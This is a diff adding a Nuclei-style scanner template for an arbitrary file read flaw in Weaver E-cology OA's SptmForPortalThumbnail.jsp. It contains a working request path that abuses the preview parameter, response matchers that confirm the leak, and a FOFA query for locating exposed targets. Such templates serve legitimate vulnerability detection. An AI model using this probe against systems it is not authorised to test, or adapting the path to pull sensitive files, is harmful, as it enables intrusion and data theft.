@@ -1,0 +1,37 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - weaver.general.BaseBean
+            - getServletConfig
+        - part: header
+          type: word
+          words:
+            - image/png
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
+id: weaver-sptmforportalthumbnail-lfi
+info:
+    author: SleepingBag945
+    description: |
+        The controllable preview parameters of SptmForPortalThumbnail.jsp are not filtered and are directly spliced to the web root directory for file downloading.
+    metadata:
+        fofa-query: app="泛微-E-Weaver"
+        max-request: 1
+        verified: true
+    name: OA E-Weaver SptmForPortalThumbnail - Arbitrary File Read
+    reference:
+        - http://124.223.89.192/archives/e-cology8-14
+        - https://github.com/GREENHAT7/pxplan/blob/main/xray_pocs/yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-479157.yml
+    severity: high
+    tags:
+        - weaver
+        - e-cology
+        - Servlet
